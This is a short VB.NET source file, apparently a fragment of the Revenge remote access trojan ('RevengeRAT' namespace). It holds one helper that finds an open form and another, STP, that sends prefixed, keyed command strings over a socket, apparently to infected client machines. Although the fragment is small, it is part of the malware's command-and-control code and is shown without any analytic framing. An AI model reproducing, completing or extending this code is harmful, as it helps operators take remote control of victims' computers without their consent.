Namespace RevengeRAT
    Public Class PLU
        ' Methods
        Public Shared Function PassDataToFormByName(ByVal Name As String) As Object
            Dim enumerator As IEnumerator
            Try
                enumerator = My.Application.OpenForms.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As Form = DirectCast(enumerator.Current, Form)
                    If (current.Name = Name) Then
                        Return current
                    End If
                Loop
            Finally
            End Try
            Return Nothing
        End Function

        Public Shared Sub STP(ByVal Sock As Integer, ByVal Input As String, ByVal ASK As Boolean)
            If ASK Then
                My.Forms.Main.s.Send(Sock, ("RE" & My.Forms.Main.Key & Input))
            Else
                My.Forms.Main.s.Send(Sock, ("DO" & My.Forms.Main.Key & Input))
            End If
        End Sub

    End Class
End Namespace


